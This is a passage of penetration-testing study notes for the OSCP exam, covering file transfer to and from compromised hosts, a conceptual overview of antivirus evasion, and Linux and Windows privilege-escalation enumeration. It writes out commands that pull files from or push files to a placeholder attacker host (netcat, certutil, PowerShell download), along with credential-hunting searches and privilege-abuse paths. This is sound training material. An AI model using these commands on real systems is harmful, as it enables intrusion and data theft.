## Netcat Download

### Attacker

```bash
nc -lvnp 4444 < file
```

### Target

```bash
nc ATTACKER_IP 4444 > file
```

## Netcat Upload

### Attacker

```bash
nc -lvnp 4444 > file
```

### Target

```bash
nc ATTACKER_IP 4444 < file
```

## Windows PowerShell

```powershell
iwr http://ATTACKER_IP:8000/file -OutFile file
```

## PowerShell WebClient

```powershell
(New-Object Net.WebClient).DownloadFile(
    "http://ATTACKER_IP/file",
    "file"
)
```

## Certutil

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file file
```

## SMB

### Kali

```bash
impacket-smbserver share $(pwd) -smb2support
```

### Windows

```cmd
copy \\ATTACKER_IP\share\file .
```

## SCP

```bash
scp file user@TARGET_IP:/tmp/
```

## FTP Automation

```cmd
ftp -v -n -s:ftp.txt
```

## TFTP

```cmd
tftp -i ATTACKER_IP GET file.exe
```

## Linux Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```text
Ctrl+Z
stty raw -echo
fg
Enter
```

---

## 33. OSCP Mental Model

When you obtain a shell, don't immediately start uploading random tools.

Think:

```text
Got Shell
    ↓
Identify OS
    ↓
Identify Shell Quality
    ↓
Check Native Tools
    ↓
Choose Transfer Direction
    ↓
Choose Native Transfer Method
    ↓
Transfer File
    ↓
Verify File
    ↓
Execute / Use File
```

### Key principle

**Use what already exists on the target whenever possible.**

This reduces:

- Detection
    
- Extra dependencies
    
- Transfer complexity
    
- Operational noise
    

and is especially useful in restricted environments.

---

## 34. What to Memorize for OSCP

Prioritize these:

### Linux

```bash
python3 -m http.server 8000
```

```bash
wget http://ATTACKER_IP:8000/file
```

```bash
curl http://ATTACKER_IP:8000/file -o file
```

```bash
nc -lvnp 4444 > file
```

```bash
nc ATTACKER_IP 4444 < file
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Windows

```powershell
iwr http://ATTACKER_IP:8000/file -OutFile file
```

```powershell
(New-Object Net.WebClient).DownloadFile(
    "http://ATTACKER_IP/file",
    "file"
)
```

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file file
```

```cmd
ftp -v -n -s:ftp.txt
```

### SMB

```bash
impacket-smbserver share $(pwd) -smb2support
```

```cmd
copy \\ATTACKER_IP\share\file .
```

### Remember

```text
Interactive shell ≠ simple command shell
```

If an application requires interaction and your shell cannot provide it, **upgrade the shell or use a non-interactive method**.
# ==Antivirus Evasion==
![[Como-elegir-un-buen-antivirus-1-1160x680.png]]
>
>
>![[Pasted image 20260923230154.png]]

**PEN-200 Module 15 — Antivirus Evasion**  
> The 2025 PEN-200 material covers AV components/operations, detection methods, on-disk and in-memory evasion, AV-evasion testing, thread injection, and automation.

## 1. What is Antivirus?

**Antivirus (AV)** is security software designed to identify and prevent malicious files or behavior.

Typical AV workflow:

```
File / Process
      ↓
Detection Engine
      ↓
Analyze
      ↓
Known malicious?
   ↙       ↘
 YES        NO
  ↓          ↓
Block      Heuristics /
            Behavior
                ↓
             Verdict
```

---

## 2. Known vs Unknown Threats

### Known Threat

Malware that has already been identified.

AV can recognize it using:

- File signatures
- Hashes
- Known malicious patterns
- Previously analyzed behavior

### Unknown Threat

A new or modified piece of malware that doesn't have an existing signature.

AV therefore relies more heavily on:

- Heuristics
- Behavioral analysis
- Static analysis
- Dynamic analysis

---

## 3. AV Components

Important components to understand:

### Scanner

Examines files/processes for malicious characteristics.

### Detection Engine

Determines whether something is suspicious or malicious.

### Signature Database

Contains known malware signatures/patterns.

### Emulator / Sandbox

Runs or simulates suspicious code in a controlled environment.

### Disassembler

Converts machine code into assembly instructions so the AV engine can inspect the code.

### Behavioral Engine

Looks at **what the program does**, rather than only what the file looks like.

---

## 4. Detection Methods

PEN-200 specifically expects understanding of AV detection methods.

## Signature-Based Detection

Looks for known byte sequences/patterns associated with malware.

Example concept:

```
Malware A
   ↓
Known byte pattern
   ↓
AV signature database
   ↓
Detected
```

### Weakness

Changing the relevant structure/content may prevent a simple signature from matching.

---

## Heuristic-Based Detection

Instead of looking for one exact signature, AV looks for **suspicious characteristics**.

For example:

```
Suspicious API usage
        +
Encoded/obfuscated code
        +
Suspicious executable structure
        ↓
     Suspicion
```

Heuristics can detect previously unknown malware.

---

## Behavioral-Based Detection

Monitors what a program actually does.

For example:

```
Process
  ↓
Allocates memory
  ↓
Writes executable code
  ↓
Creates/controls another thread
  ↓
Suspicious behavior
```

This is important because modifying the file itself may not be enough to evade behavioral detection.

---
## ==Bypassing==
![[Pasted image 20260923231401.png]]
## 5. On-Disk Evasion

**On-disk evasion** attempts to prevent the malicious executable from being detected while stored on disk.

Common concepts:

### Packers

Compress/package executable code.

```
Original executable
       ↓
     Packer
       ↓
Packed executable
```

The program may unpack itself at runtime.

### Obfuscation

Makes code harder to analyze while maintaining its functionality.

Conceptually:

```
Readable code
     ↓
Obfuscation
     ↓
Harder-to-analyze code
```

### Crypters

Encrypt/transform payload content so the original malicious content isn't directly present in the file.

### Software Protectors

Apply various transformations/protection mechanisms to executables.

These techniques are part of the conceptual on-disk evasion material, but they **do not automatically defeat modern AV/EDR**, especially behavioral detection.

---
## Basics:
![[Pasted image 20260923231715.png]]

----------
## 6. In-Memory Evasion

Instead of relying primarily on modifying the executable on disk, the attacker attempts to execute code **from memory**.

Basic idea:

```
Disk
 ↓
Legitimate process
 ↓
Memory manipulation
 ↓
Malicious code
 ↓
Execution
```

Important techniques in PEN-200 include:

- Remote Process Memory Injection
- Reflective DLL Injection
- Process Hollowing
- Inline Hooking
- Thread Injection

OffSec specifically lists **in-memory evasion** and **thread injection** in the current PEN-200 objectives.

---

## 7. Process Injection — Basic Concept

Process injection means placing/executing code inside another process.

Conceptually:

```
Attacker Process
      |
      | malicious code
      ↓
Target Process
      |
      ↓
Memory
      |
      ↓
Execution
```

Why?

Because the malicious code may execute within the context of an existing process rather than simply launching a suspicious standalone executable.

---

## 8. Remote Process Memory Injection

High-level flow:

```
Find target process
       ↓
Obtain process handle
       ↓
Allocate memory
       ↓
Write payload
       ↓
Create/execute a thread
       ↓
Payload executes
```

Important Windows concepts:

- Process
- Thread
- Virtual memory
- Handles
- Windows APIs

For OSCP, understand **what each stage does and why it can trigger AV/EDR**, rather than memorizing API calls blindly.

---

## 9. Reflective DLL Injection

Traditional DLL loading:

```
Process
   ↓
Windows loader
   ↓
DLL
```

Reflective DLL injection uses a technique where the DLL can load itself into memory without relying on the normal DLL-loading mechanism.

Conceptually:

```
DLL
 ↓
Memory
 ↓
Reflective loader
 ↓
DLL mapped
 ↓
Execution
```

---

## 10. Process Hollowing

Process hollowing uses a legitimate process as the host.

Conceptually:

```
Create legitimate process
          ↓
Suspend process
          ↓
Replace / modify its memory
          ↓
Insert malicious code
          ↓
Resume execution
```

The process may appear legitimate from the outside, while its memory contains attacker-controlled code.

---

## 11. Inline Hooking

A hook modifies execution flow so that when a function is called, execution is redirected elsewhere.

Conceptually:

```
Normal:

Function A → Function B


Hooked:

Function A
    ↓
  Hook
    ↓
Modified behavior
```

Hooks can be used for monitoring, interception, or evasion research depending on implementation.

---

## 12. Thread Injection

A simplified model:

```
Target Process
      ↓
Allocate memory
      ↓
Place code in memory
      ↓
Create/redirect execution thread
      ↓
Code executes
```

This is one of the hands-on techniques explicitly included in PEN-200.

---

## 13. AV Evasion Testing

When testing AV in a lab:

```
Payload
   ↓
Test against AV
   ↓
Detected?
 ↙       ↘
YES       NO
 ↓         ↓
Modify    Continue
 ↓
Retest
```

The important methodology is:

1. Establish a baseline.
2. Test the original artifact.
3. Identify what triggers detection.
4. Change **one variable at a time**.
5. Retest.
6. Record the result.
7. Determine whether detection is:
    - Signature-based
    - Heuristic
    - Behavioral

---

## 14. Important OSCP Mental Model

Don't think:

> "AV detects bad files."

Think:

```
                AV
                 |
       ┌─────────┼─────────┐
       ↓         ↓         ↓
   Static     Heuristic  Behavior
   Analysis   Analysis   Analysis
       |         |         |
       └─────────┼─────────┘
                 ↓
              Verdict
```

Therefore:

**Changing a file's signature ≠ defeating AV completely.**

A payload can evade static detection and still be caught once its behavior is observed.

---

## 15. On-Disk vs In-Memory

|On-Disk Evasion|In-Memory Evasion|
|---|---|
|Changes executable/file|Focuses on memory execution|
|Packers|Process injection|
|Obfuscation|Reflective DLL injection|
|Crypters|Process hollowing|
|Protectors|Thread injection|
|Mainly affects static analysis|Can affect how execution is observed|

---

## 16. What You Should Know for OSCP

According to the current PEN-200 body of knowledge, the important outcomes are to:

### Know

- Known vs unknown threats
- AV components
- AV detection engines
- Signature detection
- Heuristic detection
- Behavioral detection
- On-disk evasion
- In-memory evasion
- AV-evasion testing methodology
- Thread injection
- Automated AV-evasion workflows

### Practical mindset

```
Exploit
  ↓
Payload
  ↓
AV detects?
  ↓
Understand WHY
  ↓
Modify technique
  ↓
Retest
  ↓
Document result
```

**OSCP note:** PEN-200 treats AV evasion as a foundational module; OffSec's more advanced **PEN-300** goes substantially deeper into bypassing security mechanisms and application allow-listing.
![[Pasted image 20260924043825.png]]
# ==Privilege Escalation==
![[1712263972562.png]]
## Frist:
## Horizontal vs. Vertical Privilege Escalation

## 1. Vertical Privilege Escalation

**Vertical privilege escalation** means moving from a **lower privilege level to a higher privilege level**.

Example:

```
Normal User
     ↓
Administrator
     ↓
SYSTEM
```

Linux:

```
www-data
   ↓
root
```

### Examples

- Exploiting a SUID binary to become `root`
- Abusing a misconfigured Windows service to become `SYSTEM`
- Using `sudo` permissions to execute a command as `root`

**Key idea:**

> **Low privilege → High privilege**

---

## 2. Horizontal Privilege Escalation

**Horizontal privilege escalation** means accessing another user's resources or account while remaining at approximately the **same privilege level**.

Example:

```
User A
  ↓
User B
```

### Web example

```
Account A
   ↓
GET /api/users/1002
   ↓
Account B's data
```

This is commonly associated with **IDOR / Broken Access Control**.

**Key idea:**

> **User A → User B at the same privilege level**

---

## Quick Comparison

|Type|Example|Main idea|
|---|---|---|
|**Vertical**|User → Administrator|Increase privilege|
|**Horizontal**|Alice → Bob|Access another user's resources|
|**Vertical**|`www-data` → `root`|Low → High|
|**Horizontal**|User 1 → User 2|Same level → Another user|

### Easy way to remember

```
VERTICAL   = Go UP ↑
HORIZONTAL = Move SIDEWAYS →
```

For **OSCP**, vertical escalation is the classic **user → root/SYSTEM** privilege-escalation scenario

## 1. What Is Privilege Escalation?

**Privilege Escalation** = gaining higher privileges than the account you initially compromised.

Typical path:

```
Initial Access
     ↓
Low-privileged user
     ↓
Enumeration
     ↓
Privilege Escalation
     ↓
Root / Administrator
```

### Linux

```
user → root
```

### Windows

```
standard user → Administrator / SYSTEM
```

---

## 2. Privilege Escalation Methodology

After obtaining a shell:

```
1. Identify the current user
2. Identify OS/version
3. Enumerate users/groups
4. Enumerate permissions
5. Enumerate running processes/services
6. Check scheduled tasks/cron
7. Check SUID / writable files
8. Check credentials/secrets
9. Check network configuration
10. Identify misconfigurations
11. Exploit the weakness
12. Verify elevated privileges
```

---
## Privilege Escalation Enumration
![[Pasted image 20260930220359.png]]

![[Pasted image 20260930175739.png]]

![[Pasted image 20260930220458.png]]

![[Pasted image 20260930220534.png]]
## 3. Linux Privilege Escalation

## 3.1 Identify Current User

```
whoami
id
```

Useful additional information:

```
groups
hostname
uname -a
cat /etc/os-release
```

Check kernel:

```
uname -r
```

---

## 4. Users and Groups

List users:

```
cat /etc/passwd
```

Users with login shells:

```
cat /etc/passwd | grep -v "nologin"
```

Check groups:

```
id
groups
```

Check `/etc/shadow` permissions:

```
ls -l /etc/shadow
```

If the current user can read `/etc/shadow`, password hashes may be accessible.

---

## 5. Sudo Privileges

One of the first things to check:

```
sudo -l
```

Look for commands that can be executed as root.

Example:

```
User kali may run the following commands:
    (root) NOPASSWD: /usr/bin/find
```

This means `find` can potentially be abused to execute commands as root.

### Important

Do not only look for:

```
NOPASSWD
```

Also inspect commands where the user is allowed to execute a program as another user.

---

## 6. SUID Files

SUID allows a program to execute with the privileges of its owner.

Find SUID binaries:

```
find / -perm -4000 -type f 2>/dev/null
```

Alternative:

```
find / -perm -u=s -type f 2>/dev/null
```

Look for unusual/custom binaries.

Typical legitimate examples:

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
```

A custom SUID binary is particularly interesting.

---

## 7. SGID Files

Find SGID binaries:

```
find / -perm -2000 -type f 2>/dev/null
```

SGID causes the process to run with the privileges of the file's group.

---

## 8. Writable Files

Check files writable by your user:

```
find / -writable -type f 2>/dev/null
```

Better targeted:

```
find / -writable -type f 2>/dev/null | grep -v "/proc/"
```

Look for writable:

- scripts
- configuration files
- service files
- binaries
- cron scripts
- files executed by privileged processes

---

## 9. Writable Directories

```
find / -writable -type d 2>/dev/null
```

A writable directory becomes interesting if a privileged process executes something from it.

---

## 10. Cron Jobs

Check system-wide cron configuration:

```
cat /etc/crontab
ls -la /etc/cron.*
```

Check:

```
cat /etc/crontab
```

Example:

```
* * * * * root /opt/backup.sh
```

If `/opt/backup.sh` is writable by your user:

```
root executes script
        ↓
script is writable
        ↓
modify script
        ↓
root executes modified script
        ↓
privilege escalation
```

Check cron directories:

```
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
```

---

## 11. Running Processes

```
ps aux
```

More detailed:

```
ps auxww
```

Look for:

- root processes
- custom applications
- scripts
- unusual services
- credentials in command-line arguments

Example:

```
root  ... /bin/bash /opt/backup.sh
```

Then investigate:

```
ls -la /opt/backup.sh
```

---

## 12. Linux Services

List services:

```
systemctl list-units --type=service
```

Running services:

```
systemctl --type=service --state=running
```

Inspect a service:

```
systemctl status <service>
```

Look for:

```
ExecStart=
```

Then check whether the executable/script is writable.

---

## 13. PATH Hijacking

Check PATH:

```
echo $PATH
```

A privilege escalation can occur when a privileged script executes a command without specifying its absolute path.

Example:

```
service backup
```

instead of:

```
/usr/bin/service backup
```

If you can place a malicious executable earlier in `$PATH`, the privileged process may execute it.

---

## 14. Environment Variables

Check:

```
env
```

and:

```
printenv
```

Look for:

- credentials
- API keys
- tokens
- custom paths
- application configuration

---

## 15. Linux Capabilities

Capabilities provide specific privileges without giving a process full root privileges.

Find binaries with capabilities:

```
getcap -r / 2>/dev/null
```

Example:

```
/usr/bin/python3 = cap_setuid+ep
```

This is highly interesting because the binary has the ability to change its UID.

---

## 16. NFS Misconfiguration

Check NFS exports:

```
cat /etc/exports
```

From another machine:

```
showmount -e <target>
```

Look for dangerous configurations such as:

```
no_root_squash
```

`no_root_squash` can allow a remote root user to retain root privileges on the exported filesystem.

---

## 17. SSH

Check SSH configuration:

```
cat /etc/ssh/sshd_config
```

Look for:

```
PermitRootLogin
PasswordAuthentication
AuthorizedKeysFile
```

Check SSH keys:

```
ls -la ~/.ssh/
```

Potentially interesting files:

```
id_rsa
id_ed25519
authorized_keys
known_hosts
```

---

## 18. Credentials and Secrets

Search configuration files:

```
grep -Rni "password" /etc 2>/dev/null
```

Search common keywords:

```
grep -RniE "password|passwd|secret|token|api_key" /var/www 2>/dev/null
```

Check:

```
/var/www/
/opt/
/srv/
/home/
```

Also inspect:

```
.bash_history
```

Example:

```
cat ~/.bash_history
```

---

## 19. Web Application → Privilege Escalation

If you initially compromise a web application, inspect:

```
/var/www/
/var/www/html/
/opt/
/srv/
```

Look for:

```
config.php
.env
database credentials
backup files
SSH keys
application secrets
scripts
```

Example:

```
$db_password = "password123";
```

The same password may be reused by another local user.

---

## 20. Password Reuse

If you discover credentials:

```
username: admin
password: Password123
```

Test whether they work for:

```
su admin
```

or:

```
ssh admin@localhost
```

Also check whether the credentials belong to a higher-privileged account.

---

## 21. Kernel Exploitation

Check:

```
uname -a
```

Then identify:

```
OS version
Kernel version
Architecture
```

Search for known local privilege-escalation vulnerabilities.

**Important:** Kernel exploits should generally be considered after checking easier misconfigurations.

---

## 22. Windows Privilege Escalation

Initial checks:

```
whoami
whoami /priv
whoami /groups
hostname
systeminfo
```

PowerShell:

```
Get-ComputerInfo
```

---

## 23. Windows Users

```
whoami
net users
net user <username>
```

Groups:

```
net localgroup
net localgroup administrators
```

Check your current privileges:

```
whoami /priv
```

Interesting privileges include:

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
```

---

## 24. Windows Services

List services:

```
sc query
```

PowerShell:

```
Get-Service
```

Inspect a service:

```
sc qc <service>
```

Look for:

```
SERVICE_START_NAME
BINARY_PATH_NAME
```

---

## 25. Unquoted Service Paths

Suppose a service executes:

```
C:\Program Files\My App\service.exe
```

without quotes.

Windows may interpret paths in multiple ways.

Example:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```

If you can write to an appropriate location, this may lead to privilege escalation.

Check services:

```
wmic service get name,pathname,startname
```

---

## 26. Weak Service Permissions

Check whether your user can modify a service.

```
sc qc <service>
```

Then investigate the service executable and directory permissions.

Useful command:

```
icacls "C:\path\service.exe"
```

If a low-privileged user can modify a binary executed by SYSTEM:

```
SYSTEM service
     ↓
writable executable
     ↓
replace/modify executable
     ↓
service restart
     ↓
SYSTEM
```

---

## 27. Scheduled Tasks

List tasks:

```
schtasks /query /fo LIST /v
```

Look for:

```
SYSTEM
custom scripts
writable executables
```

PowerShell:

```
Get-ScheduledTask
```

If a SYSTEM scheduled task executes a writable script:

```
SYSTEM
  ↓
scheduled task
  ↓
writable script
  ↓
privilege escalation
```

---

## 28. Windows Registry

Check registry permissions and interesting configuration:

```
reg query HKLM
```

Potentially interesting locations include:

```
HKLM\Software
HKCU\Software
```

Look for stored credentials, application configuration, and service-related settings.

---

## 29. AlwaysInstallElevated

Check:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

and:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If enabled in both relevant locations, Windows Installer packages may execute with elevated privileges.

---

## 30. Windows Stored Credentials

Check:

```
cmdkey /list
```

Also investigate:

```
Unattended installation files
Configuration files
Application credentials
PowerShell history
Registry
Backup files
```

PowerShell history:

```
(Get-PSReadLineOption).HistorySavePath
```

---

## 31. Sensitive Files

Search common locations:

```
C:\Users\
C:\ProgramData\
C:\Windows\Temp\
C:\Temp\
C:\xampp\
C:\inetpub\
```

Look for:

```
passwords
tokens
API keys
configuration files
database credentials
backup files
scripts
```

---

## 32. DLL Hijacking

A Windows application may load a DLL from a location controlled by a low-privileged user.

Concept:

```
Privileged process
       ↓
Loads DLL
       ↓
DLL search order
       ↓
Writable directory
       ↓
Attacker-controlled DLL
       ↓
Code execution with privileged context
```

Useful investigation:

```
Which DLLs does the process load?
Where does Windows search for them?
Can the user write to one of those directories?
```

---

## 33. PATH / Binary Hijacking

Similar concept on both Linux and Windows:

```
Privileged process
       ↓
Executes command
       ↓
Searches PATH
       ↓
Attacker controls earlier location
       ↓
Malicious executable
       ↓
Higher privileges
```

---

## 34. Automated Enumeration

### Linux

Common enumeration scripts/tools:

```
LinPEAS
LinEnum
pspy
LES
```

Example:

```
./linpeas.sh
```

`pspy` is particularly useful for observing processes executed by other users without requiring root.

---

### Windows

Common tools:

```
WinPEAS
PowerUp
Seatbelt
SharpUp
PrivescCheck
```

Example:

```
.\winPEASx64.exe
```

---

## 35. OSCP Enumeration Checklist

## Linux

```
[ ] whoami
[ ] id
[ ] hostname
[ ] uname -a
[ ] /etc/os-release
[ ] sudo -l
[ ] /etc/passwd
[ ] /etc/shadow permissions
[ ] SUID
[ ] SGID
[ ] Capabilities
[ ] Writable files
[ ] Writable directories
[ ] Cron
[ ] Systemd services
[ ] Running processes
[ ] PATH
[ ] Environment variables
[ ] SSH keys
[ ] Bash history
[ ] Configuration files
[ ] Credentials
[ ] NFS
[ ] Kernel version
```

## Windows

```
[ ] whoami
[ ] whoami /priv
[ ] whoami /groups
[ ] systeminfo
[ ] net users
[ ] net localgroup administrators
[ ] Running services
[ ] Service permissions
[ ] Unquoted service paths
[ ] Scheduled tasks
[ ] Writable files/directories
[ ] Registry
[ ] AlwaysInstallElevated
[ ] Stored credentials
[ ] PowerShell history
[ ] Application configuration
[ ] DLL hijacking
[ ] PATH hijacking
[ ] WinPEAS
[ ] PowerUp
```

## 36. OSCP Mindset

Don't immediately search for an exploit.

Think:

```
Who am I?
      ↓
What can I access?
      ↓
What runs as root/SYSTEM?
      ↓
What can I modify?
      ↓
What credentials/secrets can I read?
      ↓
Can I influence a privileged process?
      ↓
Can I turn that into code execution?
      ↓
Root / SYSTEM
```

### The core PrivEsc rule

> **Find something privileged that you can influence.**

Examples:

```
Root cron job       → writable script
Root service        → writable executable
SUID binary         → exploitable behavior
SYSTEM service      → weak service permissions
SYSTEM task         → writable script
Privileged binary   → PATH/DLL hijacking
Credentials         → privileged account
Capability          → dangerous capability
NFS export          → unsafe configuration
```

This is the part I'd memorize for OSCP: **enumerate → identify a privilege boundary → find what you control → abuse that control → verify root/SYSTEM.**



# ==Windows Privilege Escalation==
![[Windows_logo_-_2012_(dark_blue).svg.webp|428]]
## Tools:
![[Pasted image 20260930220910.png|700]]


## 1. Enumeration

### Current User

```
whoami
whoami /priv
whoami /groups
```

PowerShell:

```
$env:USERNAME
$env:USERDOMAIN
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
```

Check system information:

```
systeminfo
hostname
```

PowerShell:

```
Get-ComputerInfo
```

---

## 2. Users & Groups

List local users:

```
net user
```

Details:

```
net user <username>
```

Local groups:

```
net localgroup
```

Members of Administrators:

```
net localgroup administrators
```

PowerShell:

```
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

Look for:

- Current user being a member of privileged groups
- Service accounts
- Forgotten administrator accounts
- Users with unusual privileges

---

## 3. Windows Version & Patches

```
systeminfo
```

Look for:

- Windows version
- Architecture
- Installed hotfixes
- Build number

Installed patches:

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

PowerShell:

```
Get-HotFix
```

Potential use:

```
Windows version
      ↓
Patch level
      ↓
Known vulnerability?
      ↓
Check exploit applicability
      ↓
Exploit
```

**Do not blindly run public exploits.** First verify that the target version/build and configuration are actually vulnerable.

---

## 4. Privileges

One of the most important checks:

```
whoami /priv
```

Look for interesting privileges such as:

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
```

Example:

```
SeImpersonatePrivilege    Enabled
```

This can be particularly interesting when the compromised process is running as a service account.

---

## 5. SeImpersonatePrivilege

Check:

```
whoami /priv
```

If you have:

```
SeImpersonatePrivilege
```

investigate **token impersonation / Potato-style privilege escalation techniques**.

Common families you'll encounter:

```
JuicyPotato
PrintSpoofer
GodPotato
RoguePotato
```

The exact technique depends on:

- Windows version
- Service account
- Available COM/RPC components
- Token privileges
- Architecture

---

## 6. Services

Enumerate services:

```
sc query
```

More useful:

```
wmic service get name,displayname,pathname,startname
```

PowerShell:

```
Get-Service
```

Check a specific service:

```
sc qc <service>
```

Look for:

```
SERVICE_NAME
BINARY_PATH_NAME
START_TYPE
SERVICE_START_NAME
```

Interesting situation:

```
Service runs as SYSTEM
        +
Attacker can modify service executable/configuration
        ↓
Potential privilege escalation
```

---

## 7. Unquoted Service Paths

Find suspicious paths:

```
wmic service get name,pathname
```

Example:

```
C:\Program Files\My App\service.exe
```

If the path is:

```
C:\Program Files\My App\service.exe
```

and isn't quoted, Windows may search possible executable locations such as:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```

Check write permissions on relevant directories.

Useful:

```
icacls "C:\Program Files\My App"
```

---

## 8. Weak Service Permissions

Check service configuration:

```
sc qc <service>
```

Then inspect permissions:

```
sc sdshow <service>
```

If a low-privileged user can modify the service configuration:

```
User
 ↓
Modify service configuration
 ↓
Service executes as SYSTEM
 ↓
Privilege escalation
```

Tools such as **AccessChk** can make permission enumeration easier.

Example:

```
accesschk.exe -uwcqv <username> *
```

---

## 9. Writable Service Executables

Find the service executable:

```
sc qc <service>
```

Then:

```
icacls "C:\path\service.exe"
```

Look for permissions such as:

```
M   Modify
F   Full Control
W   Write
```

Potential chain:

```
Low-privileged user
        ↓
Can modify service.exe
        ↓
Service runs as SYSTEM
        ↓
Restart service
        ↓
Code executes as SYSTEM
```

---

## 10. Scheduled Tasks

Enumerate:

```
schtasks /query /fo LIST /v
```

PowerShell:

```
Get-ScheduledTask
```

Look for:

- Tasks running as SYSTEM
- Tasks executing writable files
- Scripts in writable directories
- Tasks with weak permissions
- Interesting arguments

Example:

```
SYSTEM
  ↓
Scheduled Task
  ↓
C:\Scripts\backup.ps1
  ↓
User can modify backup.ps1
```

Potential escalation.

---

## 11. Writable Files & Directories

Check permissions:

```
icacls C:\path
```

PowerShell:

```
Get-Acl C:\path
```

Interesting locations:

```
C:\Program Files\
C:\Program Files (x86)\
C:\ProgramData\
C:\Users\Public\
C:\Windows\Temp\
```

Don't assume a writable directory is exploitable.

You need:

```
Writable location
+
Privileged process uses it
+
Attacker-controlled content is executed/loaded
```

---

## 12. PATH Hijacking

Check PATH:

```
echo %PATH%
```

PowerShell:

```
$env:PATH
```

Potential situation:

```
Privileged program executes:
backup.exe
```

Instead of:

```
C:\Program Files\App\backup.exe
```

Windows searches directories in the PATH.

If a low-privileged user can write to an earlier PATH directory:

```
Writable PATH directory
        ↓
Place malicious executable
        ↓
Privileged process calls executable by name
        ↓
Execution with privileged context
```

---

## 13. DLL Hijacking

A privileged application may load a DLL without specifying an absolute path.

Example:

```
program.exe
   ↓
LoadLibrary("example.dll")
   ↓
Windows DLL search order
```

If the attacker controls a directory searched before the legitimate DLL:

```
Writable directory
        ↓
Malicious DLL
        ↓
Privileged application loads it
        ↓
Privilege escalation
```

Important checks:

```
Which DLL is loaded?
Where does Windows search?
Can the attacker write there?
Does the privileged process load it?
```

---

## 14. Registry Enumeration

Query useful registry locations:

```
reg query HKLM
```

Installed software:

```
reg query HKLM\Software
```

Run keys:

```
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Look for:

- Credentials
- Application configuration
- Auto-start programs
- Service configuration
- Installer information

---

## 15. AlwaysInstallElevated

Check:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both are:

```
0x1
```

Windows Installer packages may run with elevated privileges.

Concept:

```
User-controlled MSI
       ↓
Windows Installer
       ↓
Elevated execution
```

---

## 16. Stored Credentials

Search common locations carefully:

```
cmdkey /list
```

Look for saved credentials:

```
Target
User
Type
```

Windows Credential Manager:

```
rundll32.exe keymgr.dll,KRShowKeyMgr
```

Potential locations:

```
C:\Users\<user>\AppData\
C:\ProgramData\
C:\Windows\System32\config\
```

Search configuration files:

```
dir /s /b *.config
dir /s /b *.xml
dir /s /b *.ini
```

Then inspect for strings such as:

```
password
passwd
pwd
username
user
token
secret
connectionString
```

---

## 17. PowerShell History

Check:

```
Get-History
```

History file:

```
(Get-PSReadLineOption).HistorySavePath
```

Usually:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Search for:

```
password
token
credential
username
```

---

## 18. Environment Variables

```
set
```

PowerShell:

```
Get-ChildItem Env:
```

Look for:

```
PASSWORD
API_KEY
TOKEN
SECRET
USERNAME
```

Applications sometimes expose credentials through environment variables.

---

## 19. Windows Credential Manager

```
cmdkey /list
```

Interesting entries can reveal access to:

- SMB
- RDP
- Applications
- Network resources

Credentials should be validated rather than assumed to provide administrator access.

---

## 20. File Search

Search for potentially sensitive files:

```
dir C:\ /s /b *.txt 2>nul
dir C:\ /s /b *.xml 2>nul
dir C:\ /s /b *.ini 2>nul
dir C:\ /s /b *.config 2>nul
```

PowerShell:

```
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.xml,*.ini,*.config
```

Search content:

```
Select-String -Path "C:\path\*" -Pattern "password|token|secret" -ErrorAction SilentlyContinue
```

---

## 21. Network Enumeration

Interfaces:

```
ipconfig /all
```

Routes:

```
route print
```

Connections:

```
netstat -ano
```

Listening ports:

```
netstat -ano | findstr LISTENING
```

Map PID → process:

```
tasklist /FI "PID eq <PID>"
```

PowerShell:

```
Get-NetTCPConnection
```

Look for:

```
127.0.0.1:<port>
```

A local-only service may expose:

- Admin panels
- Databases
- Debug interfaces
- Internal APIs

---

## 22. Processes

```
tasklist
```

More information:

```
tasklist /v
```

PowerShell:

```
Get-Process
```

Look for processes running as:

```
SYSTEM
Administrator
NT AUTHORITY\SYSTEM
```

Then investigate:

```
Executable path
Arguments
Loaded DLLs
Configuration
File permissions
```

---

## 23. Running Services

```
tasklist /svc
```

This maps processes to services.

Useful chain:

```
SYSTEM process
      ↓
Service
      ↓
Executable
      ↓
Configuration
      ↓
Writable?
```

---

## 24. SMB & Shares

Enumerate shares:

```
net share
```

Remote shares:

```
net view \\<IP>
```

Current connections:

```
net use
```

Check accessible directories for:

- Backups
- Configuration files
- Scripts
- Credentials
- Deployment files

---

## 25. Startup Locations

Check:

```
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Startup directories:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

Interesting when:

```
Privileged user/process
+
Executes attacker-controlled startup file
```

---

## 26. Token Privileges

Important distinction:

### User privileges

```
whoami /priv
```

### Group membership

```
whoami /groups
```

### Identity

```
whoami
```

Always check all three.

---

## 27. SeBackupPrivilege

